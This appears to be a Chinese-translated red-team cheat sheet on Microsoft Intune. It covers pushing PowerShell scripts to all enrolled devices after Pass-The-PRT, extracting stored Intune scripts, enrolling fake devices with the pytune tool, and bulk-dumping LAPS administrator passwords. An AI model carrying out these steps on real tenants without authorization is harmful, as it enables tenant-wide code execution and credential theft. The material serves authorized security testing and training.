# Azure 服务 - Microsoft Intune

Microsoft Intune 是一项基于云的服务，提供移动设备管理 (MDM) 和移动应用程序管理 (MAM)。它允许组织控制和保护移动设备（包括智能手机、平板电脑和 PC）上的公司数据访问。通过 Intune，企业可以实施安全策略、管理应用程序，并确保设备符合组织要求，无论这些设备是公司资产还是个人资产 (BYOD)。

## Intune 管理 (Intunes Administration)

**要求**：

* **全局管理员 (Global Administrator)** 或 **Intune 管理员 (Intune Administrator)** 权限

    ```powershell
    Get-AzureADGroup -Filter "DisplayName eq 'Intune Administrators'"
    ```

**演练步骤 (Walkthrough)**

1. 登录 <https://endpoint.microsoft.com/#home> 或使用 **传递 PRT (Pass-The-PRT)**。
2. 转到 **设备 (Devices)** -> **所有设备 (All Devices)** 以检查已注册到 Intune 的设备。
3. 转到 **脚本 (Scripts)**，点击 Windows 10 的 **添加 (Add)**。
4. 添加一则 **Powershell 脚本**。
5. 在 **分配 (Assignments)** 页面中，选择 **添加所有用户 (Add all users)** 和 **添加所有设备 (Add all devices)**。

:warning: 脚本执行可能需要长达一小时时间！

## Intune 脚本 (Intune Scripts)

**要求**：

* 具有以下权限的应用：`DeviceManagementConfiguration.Read.All`
* 已安装 `Microsoft.Graph.Intune` 依赖项：`Install-Module Microsoft.Graph.Intune`

**提取 Intune 脚本**：

以下脚本已弃用，请使用 `MgGraph` 代替 `MsGraph`，并相应地更改 `InvokeMgGraph` 函数。

* [okieselbach/Get-DeviceManagementScripts.ps1](https://raw.githubusercontent.com/okieselbach/Intune/master/Get-DeviceManagementScripts.ps1) - 获取所有或单个 Intune PowerShell 脚本，并将其保存到指定文件夹中。

    ```ps1
    Get-DeviceManagementScripts -FolderPath C:\temp -FileName myScript.ps1
    ```

* [okieselbach/Get-DeviceHealthScripts.ps1](https://raw.githubusercontent.com/okieselbach/Intune/master/Get-DeviceHealthScripts.ps1) - 获取所有或单个 Intune PowerShell 健康脚本（又称主动修复脚本 / Proactive Remediation scripts），并将其保存到指定文件夹中。

    ```ps1
    Get-DeviceHealthScripts -FolderPath C:\temp\HealthScripts
    ```

* [secureworks/pytune](https://github.com/secureworks/pytune) - Pytune 是一款后渗透工具，用于在支持多平台的情况下将伪造设备注册到 Intune。

    ```ps1
    python3 pytune.py entra_join -o Windows -d Windows_pytune -u testuser@*******.onmicrosoft.com -p ***********  
    python3 pytune.py enroll_intune -o Windows -d Windows_pytune -c Windows_pytune.pfx -u testuser@*******.onmicrosoft.com -p *********** 
    python3 pytune.py download_apps -d Windows_pytune -m Windows_pytune_mdm.pfx
    ```

## LAPS

一些组织使用 Intune 脚本为 Azure 设备重新创建了 LAPS。

```ps1
#requires -modules Microsoft.Graph.Authentication
#requires -modules Microsoft.Graph.Intune
#requires -modules LAPS
#requires -modules ImportExcel

$DaysBack = 30
Connect-MgGraph
Get-IntuneManagedDevice -Filter "Platform eq 'Windows'" |
    Foreach-Object {Get-LapsAADPassword -DevicesIds $_.DisplayName} |
        Where-Object {$_.PasswordExpirationTime -lt (Get-Date).AddDays(-$DaysBack)} |
            Export-Excel -Path "c:\temp\lapsdata.xlsx" - ClearSheet -AutoSize -Show
```

## 参考资料 (References)

* [Microsoft Intune - Microsoft Intune support for Windows LAPS](https://learn.microsoft.com/en-us/mem/intune/protect/windows-laps-overview)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)
* [Get back your Intune Proactive Remediation Scripts - Oliver Kieselbach - September 7, 2022](https://oliverkieselbach.com/2022/09/07/get-back-your-intune-proactive-remediation-scripts/)
* [Get back your Intune PowerShell Scripts - Oliver Kieselbach - February 6, 2020](https://oliverkieselbach.com/2020/02/06/get-back-your-intune-powershell-scripts/)
